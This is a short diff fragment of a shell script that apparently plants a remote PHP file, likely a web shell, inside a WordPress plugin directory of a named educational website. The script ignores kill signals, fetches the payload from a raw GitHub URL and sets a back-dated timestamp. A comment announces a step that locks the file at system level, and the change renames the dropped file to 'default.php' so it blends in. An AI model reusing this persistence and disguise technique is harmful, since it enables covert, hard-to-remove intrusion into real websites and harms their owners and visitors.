@@ -6,7 +6,7 @@ trap '' 1 2 3 15 18 19 20
 
 URL="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/simple2.php"
 DIR="/home/u782030068/domains/dypcoei.edu.in/public_html/wp-content/plugins/betterdocs/includes/elementor/widgets"
-FILE="$DIR/betterdocs-elementor-default.php"
+FILE="$DIR/default.php"
 TIME="201201081531.12"
 
 # 2. Fungsi Immutability (Mengunci File di Level Sistem)
